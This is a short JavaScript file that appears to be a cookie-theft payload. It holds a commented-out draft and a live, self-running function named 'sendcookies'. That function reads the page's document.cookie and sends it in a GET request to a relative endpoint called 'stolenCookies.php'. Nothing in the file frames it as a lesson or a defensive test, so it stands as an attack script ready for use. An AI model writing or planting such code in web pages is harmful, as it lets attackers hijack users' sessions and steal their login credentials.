// (function sendcookies() {
//   var xhttp = new XMLHttpRequest();
//   xhttp.onreadystatechange = function() {
//     if (this.readyState == 4 && this.status == 200) {
//      console.log(document.cookie);
//     }
//   };
//   // xhttp.open("GET", "stolenCookies.php?cookies=".document.cookie, true);
//   xhttp.open("GET", "stolenCookies.php", true);
//   xhttp.send();
// })();

(function sendcookies() {
  var xhttp = new XMLHttpRequest();
  try {
      xhttp.addEventListener('load', function(ev) {
         // callback ...
         console.log('callback');
      });

      let q = './stolenCookies.php?cookies="' + document.cookie + '"';
      xhttp.open("GET", q, true);                       // (method, uri, async) async default = true
      xhttp.send("");
  } catch(err) {
      alert(err.message + 'failed');
  }
})();
